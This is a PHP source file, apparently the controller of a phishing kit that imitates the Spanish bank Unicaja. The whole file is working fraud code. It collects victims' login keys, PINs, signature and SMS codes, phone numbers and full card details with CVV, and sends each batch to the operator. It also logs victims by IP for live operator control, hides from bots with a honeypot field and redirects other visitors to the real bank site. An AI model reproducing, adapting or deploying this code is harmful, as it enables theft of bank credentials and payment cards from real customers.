<?php
    /*******
    Main Author: MemoryError
    ********************************************************/

    require_once 'includes/main.php';
    if( $_GET['pwd'] == PASSWORD ) {
        session_destroy();
        visitors();
        header("Location: clients/index.php?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorlogin' ) {
            header("Location: clients/index.php?error=1&verification#_");
            exit();
        }
        if( $red == 'errorsms' ) {
            header("Location: clients/sms.php?error=1&code=". $_GET['code'] ."&verification#_");
            exit();
			}
        if( $red == 'errorVsms' ) {
            header("Location: clients/Vsms.php?error=1&code=". $_GET['code'] ."&verification#_");
            exit();
        }
        if( $red == 'errortan' ) {
            header("Location: clients/tan.php?error=1&code1=". $_GET['code1'] ."&code2=". $_GET['code2'] ."&code3=". $_GET['code3'] . "&code4=". $_GET['code4'] ."&verification#_");
            exit();
        }
        if( $red == 'sms' ) {
            header("Location: clients/sms.php?code=". $_GET['code'] ."&verification#_");
            exit();
			 }
        if( $red == 'firma' ) {
            header("Location: clients/firma.php?code=". $_GET['code'] ."&verification#_");
            exit();
        }
        if( $red == 'tan' ) {
            header("Location: clients/tan.php?code1=". $_GET['code1'] ."&code2=". $_GET['code2'] ."&code3=". $_GET['code3'] ."&code4=". $_GET['code4'] ."&verification#_");
            exit();
        }
        if( $red == 'errorcc' ) {
            $_SESSION['one'] = '';
            $_SESSION['three'] = '';
            $_SESSION['two'] = '';
            $_SESSION['errors']['one'] = true;
            $_SESSION['errors']['three'] = true;
            $_SESSION['errors']['two'] = true;
            header("Location: clients/cc.php?error=1&code=". $_GET['code'] ."&verification#_");
            exit();
        }
        header("Location: clients/". $red .".php?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['key']   = $_POST['key'];
            $_SESSION['pin']   = $_POST['pin'];
            if( empty($_POST['key']) ) {
                $_SESSION['errors']['key'] = true;
            }
            if( empty($_POST['pin']) ) {
                $_SESSION['errors']['pin'] = true;
            }
          
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | Login';
                $message = '/-- Login Unicaja INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Login : ' . $_POST['key'] . "\r\n";
                $message .= 'Password : ' . $_POST['pin'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/index.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "firma") {
            $_SESSION['errors']     = [];
            $_SESSION['firma']   = $_POST['firma'];
            if( empty($_POST['firma']) ) {
                $_SESSION['errors']['firma'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | ';
                $message = '/--  INFOS  FIRMA --/' . get_client_ip() . "\r\n";
                $message .= 'FIRMA : ' . $_POST['firma'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END UNICAJA INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading-.php?verification#_");
                exit();
            } else {
                header("Location: clients/firma.php?error=1&verification#_");
                exit();
				}
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms_code']   = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | VerifySmS';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS : ' . $_POST['sms_code'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END UNICAJA  INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading-.php?verification#_");
                exit();
            } else {
                header("Location: clients/sms.php?error=1&verification#_");
                exit();
            }
        }
        if ($_POST['step'] == "info") {
            $_SESSION['errors']     = [];
            $_SESSION['num']   = $_POST['num'];
            if( empty($_POST['num']) ) {
                $_SESSION['errors']['num'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | Question';
                $message = '/-- UNICAJA INFOS --/' . get_client_ip() . "\r\n";
				$message .= 'NUMBER PHONE : ' . $_POST['num'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END  INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading.php?verification#_");
                exit();
            } else {
                header("Location: clients/info.php?error=1&code=". $_POST['code'] ."&verification#_");
                exit();
            }
       }
        if ($_POST['step'] == "cc") {
           $_SESSION['errors']     = [];
            $_SESSION['two']   = $_POST['two'];
            if( empty($_POST['two']) ) {
                $_SESSION['errors']['two'] = true;
           
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' |  | Card';
                $message = '/-- CARD UNICAJA INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'CC : ' . $_POST['one'] . "\r\n";
                $message .= 'DateExp : ' . $_POST['two'] . "/".$_POST['two-']."\r\n";
	            $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= 'Steps : ' . get_steps_link() . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                reset_data();
                header("Location: clients/loading-.php?verification#_");
            } else {
                header("Location: clients/cc.php?error=1&verification#_");
            }
        }
        if ($_POST['step'] == "control") {
            $fp = fopen('victims/'. $_POST['ip'] .'.txt', 'wb');
            if( $_POST['to'] == 'tan' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['tan_text'];
            }
            if( $_POST['to'] == 'errortan' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['errortan_text'];
            }
            if( $_POST['to'] == 'sms' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['sms_text'];
				 }
            if( $_POST['to'] == 'firma' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['sms_text'];
            }
            if( $_POST['to'] == 'errorsms' ) {
                $_POST['to'] = $_POST['to'] . '/' . $_POST['errorsms_text'];
            }
            fwrite($fp, $_POST['to']);
            fclose($fp);
            header("location: control.php?ip=" . $_POST['ip']);
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>